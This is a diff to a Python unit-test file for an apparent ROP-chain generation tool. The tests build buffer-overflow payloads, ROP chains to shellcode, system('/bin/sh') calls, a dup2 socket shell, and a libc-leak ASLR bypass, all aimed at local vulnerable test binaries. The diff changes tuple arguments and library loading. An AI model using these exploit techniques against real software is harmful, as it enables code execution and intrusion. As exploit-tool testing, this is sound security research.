@@ -74,7 +74,7 @@ class BofTests(unittest.TestCase):
     buffer_address = int(line.split(":")[1],16)
 
     target_address = buffer_address + 1024
-    rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)
+    rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)
     payload = 'A'*512 + 'B'*8 + rop
     payload += ((1024 - len(payload)) * 'B') + self.shellcode_amd64()
 
@@ -86,7 +86,7 @@ class BofTests(unittest.TestCase):
     bof_execve = process([filename,'3000']) # start the program
     p = remote('localhost', 2222)
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     goals = [
       ["function", "dup2", 4, 0],
       ["function", "dup2", 4, 1],
@@ -116,7 +116,7 @@ class BofTests(unittest.TestCase):
     else:
       filename, arch = e('bof_many_args_x86'), archinfo.ArchX86()
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     rop = ropme.rop(files, [], [["function", "callme", 11,12,13,14,15,16,17,18]], arch = arch, log_level = logging.DEBUG)
     if is_64bit:
       payload = 'A'*512 + 'B'*8 + rop
@@ -130,7 +130,7 @@ class BofTests(unittest.TestCase):
   def test_bof_shell(self):
     filename = e('bof_shell')
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     rop = ropme.rop(files, [], [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)
     payload = 'A'*512 + 'B'*8 + rop
 
@@ -141,7 +141,7 @@ class BofTests(unittest.TestCase):
 
   def test_bof_system(self):
     filename = e('bof_system2')
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     rop = ropme.rop(files, [], [["function", "system", "uname -a\x00"], ["function", "exit", 33]], log_level = logging.DEBUG)
     payload = 'A'*512 + 'B'*8 + rop
 
@@ -163,7 +163,7 @@ class BofTests(unittest.TestCase):
     buffer_address = int(p.readline().split(":")[1],16)
     target_address = buffer_address + 1024
 
-    rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address)
+    rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address)
     payload = 'A'*512 + 'B'*8 + rop
     payload += ((1024 - len(payload)) * 'B') + self.shellcode_amd64()
 
@@ -179,7 +179,7 @@ class BofTests(unittest.TestCase):
   def do_test_bof_read_got(self, filename):
     p = process([filename,'3000'])
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)
 
     payload = 'A'*512 + ('B'*8) + rop
@@ -191,7 +191,7 @@ class BofTests(unittest.TestCase):
     filename = e('bof_read_got_x86')
     p = process([filename,'3000'])
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     rop = ropme.rop(files, ["/lib/i386-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]], arch = archinfo.ArchX86(), log_level = logging.DEBUG)
 
     payload = 'A'*512 + ('B'*16) + rop
@@ -201,10 +201,11 @@ class BofTests(unittest.TestCase):
 
   def test_leak_overflowx86(self):
     filename = e('leak_overflow')
-    libc, libc_gadgets = e('libc.so'), e('libc.gadgets')
+    libc, libc_gadgets = e('libc-2.23.so'), e('libc.gadgets')
 
-    os.environ['LD_PRELOAD'] = libc # Ensure we use the libc that we've pulled gadgets from
+    os.environ['LD_LIBRARY_PATH'] = os.path.dirname(libc)
     p = process([filename])
+    assert p.libc.path == os.path.abspath(libc)  # Ensure we use the libc that we've pulled gadgets from
 
     p.writeline("1")
     p.readuntil("what address would you like to peek at?\n")
@@ -213,7 +214,7 @@ class BofTests(unittest.TestCase):
     libc_address = fgets_addr - ELF(libc).symbols['fgets']
 
     goals = [ ["function", "system", "/bin/sh"] ]
-    files = [(filename, None, 0), (libc, libc_gadgets, libc_address)]
+    files = [(filename, None, None), (libc, libc_gadgets, libc_address)]
     rop = ropme.rop(files, [libc], goals, arch = archinfo.ArchX86(), log_level = logging.DEBUG)
 
     p.writeline("2")
@@ -229,7 +230,7 @@ class BofTests(unittest.TestCase):
     filename = e('gets')
     p = process([filename])
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None)]
     goals = [ ["function", "system", "/bin/sh"] ]
     rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, bad_bytes = bad_bytes)
 
@@ -242,12 +243,16 @@ class BofTests(unittest.TestCase):
 
   def test_strcpy(self):
     bad_bytes = '\0'
+    libc, libc_gadgets = e('libc-2.23.so'), e('libc.gadgets')
     filename = e('strcpy')
+    os.environ['LD_LIBRARY_PATH'] = os.path.dirname(libc)
     p = process([filename])
+    assert p.libc.path == os.path.abspath(libc)  # Ensure we use the libc that we've pulled gadgets from
+    libc_address = p.libc.address
 
-    files = [(filename, None, 0)]
+    files = [(filename, None, None), (libc, libc_gadgets, libc_address)]
     goals = [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]]
-    rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, bad_bytes = bad_bytes)
+    rop = ropme.rop(files, [], goals, arch = archinfo.ArchX86(), log_level = logging.DEBUG, bad_bytes = bad_bytes)
 
     self.assertFalse(self.contains_bad_bytes(rop, bad_bytes), "Bad bytes found in ROP payload for {} exploit".format(filename))
 
@@ -259,4 +264,3 @@ class BofTests(unittest.TestCase):
 
 if __name__ == '__main__':
   unittest.main()
-
